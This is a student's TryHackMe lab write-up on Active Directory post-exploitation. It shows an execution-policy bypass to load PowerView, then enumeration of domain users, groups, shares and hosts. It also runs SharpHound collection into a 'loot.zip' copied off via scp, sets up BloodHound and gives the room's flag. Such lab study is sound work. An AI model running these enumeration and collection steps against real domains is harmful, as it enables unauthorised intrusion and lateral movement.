# Post-Exploitation Basics: Methodologies & Tools

**Platform:** TryHackMe | **Category:** Active Directory / Windows | **Date:** Dec 20, 2025 | **Link:** https://tryhackme.com/room/postexploit |

## 1. Executive Summary
This project explores standard post-compromise methodologies within a Windows Active Directory environment. The objective was to utilize industry-standard tools to enumerate domain users, map attack paths, and extract credentials for privilege escalation.

**Tools Deployed:**
* **PowerView:** PowerShell-based domain enumeration.
* **BloodHound:** Graph theory analysis for attack path visualization.
* **Mimikatz:** Credential dumping and ticket manipulation.
* **Server Manager:** Native Windows administration tools.

## 2. Domain Enumeration (PowerView)
**Objective:** Gain situational awareness of the domain without triggering immediate alerts.

### 2.1 Initialization
I first accessed the target machine via ssh Administrator@$box and used the password that was provided. To run the Powerview script I ran, 
```powershell
powershell -ep bypass
. .\Downloads\PowerView.ps1
```
PowerView.ps1 was alredy pre-downloaded as indicated in the THM room.

### 2.2 User Enumeration
I then enumerated all of the domain users to attempt to identify potential targets for lateral mvemoent. 
```powershell
Get-NetUser | select cn
```
### 2.3 Domain Enumeration
Then enumerated the domain groups:
```powershell
Get-NetGroup -GroupName *admin*
```
### 2.4 Shared Folder Enumeration
```powershell
Invoke-ShareFinder
```
In our output we can see that the folder "Share" was created manually by a user and/or administrator. All of the other folders are native in the standard Windows installation. "Share" was specifically created to share files on the network. 

### 2.5 OS Fingerprinting
I was tasked with finding the operating system running inside of the network that is not Windows Server 2019
```powershell
Get-NetComputer -fulldata | select operatingsystem
```
Which gave us an output of Windows Server 2019 Standard, and two instances of Windows 10 Enterprise Evaluation. The enumeration reveals to us that their are two other hosts running Windows 10 Enterprise on the network, which could indicate two potential client workstation targets. 

### I was also tasked with finding a flag within the enumerated users, as we can one of the users is POST{P0W3RV13W_FTW}


## 3. Enumeration with Bloodhound
**Objective:** Map out the the network such that I am able to visualize potential attack paths and targets. Ones that are not so apparent on simple lists. While PowerView gave us a list of users, BloodHound will draw a map showing just how those users are connectived. 

### 3.2 Data Ingestion with SharpHound
```bash 
sudo apt-get install bloodhound
sudo neo4j console
```
```powershell
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
What I did learn is that using Sharphound, specifically '-CollectionMethod All' can be extremely noisy, as it directly touches every object in the Active Directory database which will generate an abundance of LDAP and SMB traffic. The command below allows me to scp the zip folder to my cwd in Kali. 

```bash
scp Administrationr@$box:Desktop/20251222205716_loot.zip .  
```

### 3.3 Mapping the Network with Bloodhound
```bash
bloodhound
```
I will then run bloodhound on Kali Linux. Which will open a web browser prompting me to input a username and password, and entering the username and password provided: "neo4j", then changing it bloodhoud. 

CORRECTION: I had to go back and install the proper Legacy Bloodhound in order to run the GUI. 
```bash
sudo apt update
sudo apt install bloodhound neo4j -y
```
